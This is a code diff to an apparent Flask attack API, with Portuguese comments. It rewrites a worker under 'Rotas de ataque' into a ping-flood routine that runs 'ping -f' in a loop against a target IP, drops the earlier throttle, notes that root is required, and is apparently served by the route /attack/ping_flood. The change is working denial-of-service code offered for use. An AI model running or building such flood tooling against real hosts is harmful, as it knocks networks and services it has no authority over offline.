@@ -46,13 +46,24 @@ def get_rules():
 
 
 # Rotas de ataque
-def ping_flood_worker(target_ip):
-    global attacking
+def ping_flood(target_ip):
+    """
+    Esta função executa o ataque de Ping Flood em um loop.
+    Ela será executada em uma thread separada para não travar a API.
+    """
+    # O comando ping -f (flood) envia pings o mais rápido possível.
+    # IMPORTANTE: Este comando geralmente requer privilégios de root (sudo).
+    command = f"ping -f {target_ip}"
+
+    # O loop continua enquanto a variável global 'attacking' for True.
     while attacking:
-        subprocess.run(['ping', '-c', '1', '-W', '0.2', target_ip], stdout=subprocess.DEVNULL,
-                       stderr=subprocess.DEVNULL)
-        # Sleep para não sobrecarregar 100% a CPU do Pi
-        time.sleep(0.01)
+        try:
+            # Executa o comando ping. stdout e stderr são redirecionados para DEVNULL
+            # para não poluir o terminal. O comando é interrompido se demorar mais de 5s.
+            subprocess.run(command.split(), check=True, timeout=5, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
+            # Se um ping falhar ou der timeout, simplesmente ignora e continua o loop.
+            pass
 
 
 @app.route('/attack/ping_flood', methods=['POST'])
